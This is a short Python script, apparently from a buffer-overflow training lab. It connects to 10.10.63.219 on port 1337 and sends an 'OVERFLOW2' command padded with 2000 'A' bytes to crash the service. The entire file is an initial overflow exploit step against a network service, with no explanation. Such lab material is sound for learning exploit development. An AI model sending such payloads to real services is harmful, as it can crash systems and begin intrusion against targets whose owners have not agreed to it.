#!/usr/bin/python3
import socket

host, port = "10.10.63.219", 1337

cmd = b"OVERFLOW2 "

payload = b"".join([
            cmd,
            b"A" * 2000,
        ])

with socket.socket() as s:
    s.connect((host,port))
    s.send(payload)

